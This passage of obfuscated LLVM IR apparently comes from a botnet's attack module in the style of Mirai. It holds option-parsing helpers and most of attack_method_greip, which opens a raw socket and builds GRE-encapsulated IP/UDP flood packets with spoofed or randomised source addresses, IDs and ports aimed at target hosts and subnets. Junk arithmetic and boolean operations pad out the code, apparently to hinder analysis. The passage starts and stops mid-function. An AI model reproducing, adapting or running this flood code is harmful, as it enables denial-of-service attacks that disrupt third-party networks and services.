  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %42

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %44

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = sub i32 0, %36
  %38 = sub i32 0, 1
  %39 = add i32 %37, %38
  %40 = sub i32 0, %39
  %41 = add nsw i32 %36, 1
  store i32 %40, i32* %10, align 4
  br label %11

; <label>:42:                                     ; preds = %11
  %43 = load i8*, i8** %9, align 8
  store i8* %43, i8** %5, align 8
  br label %44

; <label>:44:                                     ; preds = %42, %27
  %45 = load i8*, i8** %5, align 8
  ret i8* %45
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #6
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %76, i32* %10, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %4
  br label %549

; <label>:79:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %80 = load i32, i32* %10, align 4
  %81 = bitcast i32* %9 to i8*
  %82 = call i32 @setsockopt(i32 %80, i32 0, i32 3, i8* %81, i32 4) #6
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %87

; <label>:84:                                     ; preds = %79
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 %85)
  br label %549

; <label>:87:                                     ; preds = %79
  store i32 0, i32* %9, align 4
  br label %88

; <label>:88:                                     ; preds = %319, %87
  %89 = load i32, i32* %9, align 4
  %90 = load i8, i8* %5, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %89, %91
  br i1 %92, label %93, label %326

; <label>:93:                                     ; preds = %88
  %94 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %95 = load i8**, i8*** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8*, i8** %95, i64 %97
  store i8* %94, i8** %98, align 8
  %99 = load i8**, i8*** %11, align 8
  %100 = load i32, i32* %9, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8*, i8** %99, i64 %101
  %103 = load i8*, i8** %102, align 8
  %104 = bitcast i8* %103 to %struct.iphdr*
  store %struct.iphdr* %104, %struct.iphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i64 1
  %107 = bitcast %struct.iphdr* %106 to %struct.grehdr*
  store %struct.grehdr* %107, %struct.grehdr** %23, align 8
  %108 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %109 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %108, i64 1
  %110 = bitcast %struct.grehdr* %109 to %struct.iphdr*
  store %struct.iphdr* %110, %struct.iphdr** %24, align 8
  %111 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %112 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %111, i64 1
  %113 = bitcast %struct.iphdr* %112 to %struct.udphdr*
  store %struct.udphdr* %113, %struct.udphdr** %25, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = xor i8 15, -1
  %118 = xor i8 %116, %117
  %119 = and i8 %118, %116
  %120 = and i8 %116, 15
  %121 = xor i8 %119, -1
  %122 = xor i8 64, -1
  %123 = xor i8 -47, -1
  %124 = and i8 %121, -47
  %125 = and i8 %119, %123
  %126 = and i8 %122, -47
  %127 = and i8 64, %123
  %128 = or i8 %124, %125
  %129 = or i8 %126, %127
  %130 = xor i8 %128, %129
  %131 = or i8 %121, %122
  %132 = xor i8 %131, -1
  %133 = or i8 -47, %123
  %134 = and i8 %132, %133
  %135 = or i8 %130, %134
  %136 = or i8 %119, 64
  store i8 %135, i8* %115, align 4
  %137 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %138 = bitcast %struct.iphdr* %137 to i8*
  %139 = load i8, i8* %138, align 4
  %140 = xor i8 %139, -1
  %141 = xor i8 -16, -1
  %142 = xor i8 42, -1
  %143 = or i8 %140, %141
  %144 = or i8 42, %142
  %145 = xor i8 %143, -1
  %146 = and i8 %145, %144
  %147 = and i8 %139, -16
  %148 = and i8 %146, 5
  %149 = xor i8 %146, 5
  %150 = or i8 %148, %149
  %151 = or i8 %146, 5
  store i8 %150, i8* %138, align 4
  %152 = load i8, i8* %12, align 1
  %153 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 1
  store i8 %152, i8* %154, align 1
  %155 = load i32, i32* %18, align 4
  %156 = sext i32 %155 to i64
  %157 = add i64 52, 8857388734478629567
  %158 = add i64 %157, %156
  %159 = sub i64 %158, 8857388734478629567
  %160 = add i64 52, %156
  %161 = trunc i64 %159 to i16
  %162 = call zeroext i16 @htons(i16 zeroext %161) #7
  %163 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 2
  store i16 %162, i16* %164, align 2
  %165 = load i16, i16* %13, align 2
  %166 = call zeroext i16 @htons(i16 zeroext %165) #7
  %167 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 3
  store i16 %166, i16* %168, align 4
  %169 = load i8, i8* %14, align 1
  %170 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 5
  store i8 %169, i8* %171, align 4
  %172 = load i8, i8* %15, align 1
  %173 = icmp ne i8 %172, 0
  br i1 %173, label %174, label %178

; <label>:174:                                    ; preds = %93
  %175 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %176 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 4
  store i16 %175, i16* %177, align 2
  br label %178

; <label>:178:                                    ; preds = %174, %93
  %179 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 6
  store i8 47, i8* %180, align 1
  %181 = load i32, i32* %21, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 8
  store i32 %181, i32* %183, align 4
  %184 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %187, i32 0, i32 1
  %189 = load i32, i32* %188, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 9
  store i32 %189, i32* %191, align 4
  %192 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %193 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %194 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %193, i32 0, i32 1
  store i16 %192, i16* %194, align 2
  %195 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %196 = bitcast %struct.iphdr* %195 to i8*
  %197 = load i8, i8* %196, align 4
  %198 = xor i8 15, -1
  %199 = xor i8 %197, %198
  %200 = and i8 %199, %197
  %201 = and i8 %197, 15
  %202 = xor i8 %200, -1
  %203 = xor i8 64, -1
  %204 = xor i8 -2, -1
  %205 = and i8 %202, -2
  %206 = and i8 %200, %204
  %207 = and i8 %203, -2
  %208 = and i8 64, %204
  %209 = or i8 %205, %206
  %210 = or i8 %207, %208
  %211 = xor i8 %209, %210
  %212 = or i8 %202, %203
  %213 = xor i8 %212, -1
  %214 = or i8 -2, %204
  %215 = and i8 %213, %214
  %216 = or i8 %211, %215
  %217 = or i8 %200, 64
  store i8 %216, i8* %196, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %219 = bitcast %struct.iphdr* %218 to i8*
  %220 = load i8, i8* %219, align 4
  %221 = xor i8 %220, -1
  %222 = xor i8 -16, -1
  %223 = xor i8 -103, -1
  %224 = or i8 %221, %222
  %225 = or i8 -103, %223
  %226 = xor i8 %224, -1
  %227 = and i8 %226, %225
  %228 = and i8 %220, -16
  %229 = and i8 %227, 5
  %230 = xor i8 %227, 5
  %231 = or i8 %229, %230
  %232 = or i8 %227, 5
  store i8 %231, i8* %219, align 4
  %233 = load i8, i8* %12, align 1
  %234 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 1
  store i8 %233, i8* %235, align 1
  %236 = load i32, i32* %18, align 4
  %237 = sext i32 %236 to i64
  %238 = sub i64 0, %237
  %239 = sub i64 28, %238
  %240 = add i64 28, %237
  %241 = trunc i64 %239 to i16
  %242 = call zeroext i16 @htons(i16 zeroext %241) #7
  %243 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %244 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %243, i32 0, i32 2
  store i16 %242, i16* %244, align 2
  %245 = load i16, i16* %13, align 2
  %246 = zext i16 %245 to i32
  %247 = xor i32 %246, -1
  %248 = and i32 -1, %247
  %249 = xor i32 -1, -1
  %250 = and i32 %246, %249
  %251 = or i32 %248, %250
  %252 = xor i32 %246, -1
  %253 = trunc i32 %251 to i16
  %254 = call zeroext i16 @htons(i16 zeroext %253) #7
  %255 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %256 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %255, i32 0, i32 3
  store i16 %254, i16* %256, align 4
  %257 = load i8, i8* %14, align 1
  %258 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %259 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %258, i32 0, i32 5
  store i8 %257, i8* %259, align 4
  %260 = load i8, i8* %15, align 1
  %261 = icmp ne i8 %260, 0
  br i1 %261, label %262, label %266

; <label>:262:                                    ; preds = %178
  %263 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %264 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 4
  store i16 %263, i16* %265, align 2
  br label %266

; <label>:266:                                    ; preds = %262, %178
  %267 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 6
  store i8 17, i8* %268, align 1
  %269 = call i32 @rand_next()
  %270 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 8
  store i32 %269, i32* %271, align 4
  %272 = load i8, i8* %20, align 1
  %273 = icmp ne i8 %272, 0
  br i1 %273, label %274, label %280

; <label>:274:                                    ; preds = %266
  %275 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %276 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %275, i32 0, i32 9
  %277 = load i32, i32* %276, align 4
  %278 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %279 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %278, i32 0, i32 9
  store i32 %277, i32* %279, align 4
  br label %301

; <label>:280:                                    ; preds = %266
  %281 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 8
  %283 = load i32, i32* %282, align 4
  %284 = add i32 %283, 875303025
  %285 = sub i32 %284, 1024
  %286 = sub i32 %285, 875303025
  %287 = sub i32 %283, 1024
  %288 = xor i32 %286, -1
  %289 = and i32 629291834, %288
  %290 = xor i32 629291834, -1
  %291 = and i32 %286, %290
  %292 = xor i32 -1, -1
  %293 = and i32 %292, 629291834
  %294 = and i32 -1, %290
  %295 = or i32 %289, %291
  %296 = or i32 %293, %294
  %297 = xor i32 %295, %296
  %298 = xor i32 %286, -1
  %299 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %300 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %299, i32 0, i32 9
  store i32 %297, i32* %300, align 4
  br label %301

; <label>:301:                                    ; preds = %280, %274
  %302 = load i16, i16* %16, align 2
  %303 = call zeroext i16 @htons(i16 zeroext %302) #7
  %304 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %305 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %304, i32 0, i32 0
  store i16 %303, i16* %305, align 2
  %306 = load i16, i16* %17, align 2
  %307 = call zeroext i16 @htons(i16 zeroext %306) #7
  %308 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %309 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %308, i32 0, i32 1
  store i16 %307, i16* %309, align 2
  %310 = load i32, i32* %18, align 4
  %311 = sext i32 %310 to i64
  %312 = sub i64 0, %311
  %313 = sub i64 8, %312
  %314 = add i64 8, %311
  %315 = trunc i64 %313 to i16
  %316 = call zeroext i16 @htons(i16 zeroext %315) #7
  %317 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %318 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %317, i32 0, i32 2
  store i16 %316, i16* %318, align 2
  br label %319

; <label>:319:                                    ; preds = %301
  %320 = load i32, i32* %9, align 4
  %321 = sub i32 0, %320
  %322 = sub i32 0, 1
  %323 = add i32 %321, %322
  %324 = sub i32 0, %323
  %325 = add nsw i32 %320, 1
  store i32 %324, i32* %9, align 4
  br label %88

; <label>:326:                                    ; preds = %88
  br label %327

; <label>:327:                                    ; preds = %548, %326
  store i32 0, i32* %9, align 4
  br label %328

; <label>:328:                                    ; preds = %542, %327
  %329 = load i32, i32* %9, align 4
  %330 = load i8, i8* %5, align 1
  %331 = zext i8 %330 to i32
  %332 = icmp slt i32 %329, %331
  br i1 %332, label %333, label %548

; <label>:333:                                    ; preds = %328
  %334 = load i8**, i8*** %11, align 8
  %335 = load i32, i32* %9, align 4
  %336 = sext i32 %335 to i64
  %337 = getelementptr inbounds i8*, i8** %334, i64 %336
  %338 = load i8*, i8** %337, align 8
  store i8* %338, i8** %26, align 8
  %339 = load i8*, i8** %26, align 8
  %340 = bitcast i8* %339 to %struct.iphdr*
  store %struct.iphdr* %340, %struct.iphdr** %27, align 8
  %341 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %342 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %341, i64 1
  %343 = bitcast %struct.iphdr* %342 to %struct.grehdr*
  store %struct.grehdr* %343, %struct.grehdr** %28, align 8
  %344 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %345 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %344, i64 1
  %346 = bitcast %struct.grehdr* %345 to %struct.iphdr*
  store %struct.iphdr* %346, %struct.iphdr** %29, align 8
  %347 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i64 1
  %349 = bitcast %struct.iphdr* %348 to %struct.udphdr*
  store %struct.udphdr* %349, %struct.udphdr** %30, align 8
  %350 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %351 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %350, i64 1
  %352 = bitcast %struct.udphdr* %351 to i8*
  store i8* %352, i8** %31, align 8
  %353 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %354 = load i32, i32* %9, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %353, i64 %355
  %357 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %356, i32 0, i32 2
  %358 = load i8, i8* %357, align 4
  %359 = zext i8 %358 to i32
  %360 = icmp slt i32 %359, 32
  br i1 %360, label %361, label %386

; <label>:361:                                    ; preds = %333
  %362 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %363 = load i32, i32* %9, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %362, i64 %364
  %366 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %365, i32 0, i32 1
  %367 = load i32, i32* %366, align 4
  %368 = call i32 @ntohl(i32 %367) #7
  %369 = call i32 @rand_next()
  %370 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %371 = load i32, i32* %9, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %370, i64 %372
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %373, i32 0, i32 2
  %375 = load i8, i8* %374, align 4
  %376 = zext i8 %375 to i32
  %377 = lshr i32 %369, %376
  %378 = sub i32 0, %368
  %379 = sub i32 0, %377
  %380 = add i32 %378, %379
  %381 = sub i32 0, %380
  %382 = add i32 %368, %377
  %383 = call i32 @htonl(i32 %381) #7
  %384 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 9
  store i32 %383, i32* %385, align 4
  br label %386

; <label>:386:                                    ; preds = %361, %333
  %387 = load i32, i32* %21, align 4
  %388 = icmp eq i32 %387, -1
  br i1 %388, label %389, label %393

; <label>:389:                                    ; preds = %386
  %390 = call i32 @rand_next()
  %391 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %392 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %391, i32 0, i32 8
  store i32 %390, i32* %392, align 4
  br label %393

; <label>:393:                                    ; preds = %389, %386
  %394 = load i16, i16* %13, align 2
  %395 = zext i16 %394 to i32
  %396 = icmp eq i32 %395, 65535
  br i1 %396, label %397, label %423

; <label>:397:                                    ; preds = %393
  %398 = call i32 @rand_next()
  %399 = xor i32 65535, -1
  %400 = xor i32 %398, %399
  %401 = and i32 %400, %398
  %402 = and i32 %398, 65535
  %403 = trunc i32 %401 to i16
  %404 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 3
  store i16 %403, i16* %405, align 4
  %406 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %407 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %406, i32 0, i32 3
  %408 = load i16, i16* %407, align 4
  %409 = zext i16 %408 to i32
  %410 = add i32 %409, 162480436
  %411 = sub i32 %410, 1000
  %412 = sub i32 %411, 162480436
  %413 = sub nsw i32 %409, 1000
  %414 = xor i32 %412, -1
  %415 = and i32 -1, %414
  %416 = xor i32 -1, -1
  %417 = and i32 %412, %416
  %418 = or i32 %415, %417
  %419 = xor i32 %412, -1
  %420 = trunc i32 %418 to i16
  %421 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 3
  store i16 %420, i16* %422, align 4
  br label %423

; <label>:423:                                    ; preds = %397, %393
  %424 = load i16, i16* %16, align 2
  %425 = zext i16 %424 to i32
  %426 = icmp eq i32 %425, 65535
  br i1 %426, label %427, label %436

; <label>:427:                                    ; preds = %423
  %428 = call i32 @rand_next()
  %429 = xor i32 65535, -1
  %430 = xor i32 %428, %429
  %431 = and i32 %430, %428
  %432 = and i32 %428, 65535
  %433 = trunc i32 %431 to i16
  %434 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %435 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %434, i32 0, i32 0
  store i16 %433, i16* %435, align 2
  br label %436

; <label>:436:                                    ; preds = %427, %423
  %437 = load i16, i16* %17, align 2
  %438 = zext i16 %437 to i32
  %439 = icmp eq i32 %438, 65535
  br i1 %439, label %440, label %449

; <label>:440:                                    ; preds = %436
  %441 = call i32 @rand_next()
  %442 = xor i32 65535, -1
  %443 = xor i32 %441, %442
  %444 = and i32 %443, %441
  %445 = and i32 %441, 65535
  %446 = trunc i32 %444 to i16
  %447 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %448 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %447, i32 0, i32 1
  store i16 %446, i16* %448, align 2
  br label %449

; <label>:449:                                    ; preds = %440, %436
  %450 = load i8, i8* %20, align 1
  %451 = icmp ne i8 %450, 0
  br i1 %451, label %456, label %452

; <label>:452:                                    ; preds = %449
  %453 = call i32 @rand_next()
  %454 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %455 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %454, i32 0, i32 9
  store i32 %453, i32* %455, align 4
  br label %462

; <label>:456:                                    ; preds = %449
  %457 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %458 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %457, i32 0, i32 9
  %459 = load i32, i32* %458, align 4
  %460 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %461 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %460, i32 0, i32 9
  store i32 %459, i32* %461, align 4
  br label %462

; <label>:462:                                    ; preds = %456, %452
  %463 = load i8, i8* %19, align 1
  %464 = icmp ne i8 %463, 0
  br i1 %464, label %465, label %468

; <label>:465:                                    ; preds = %462
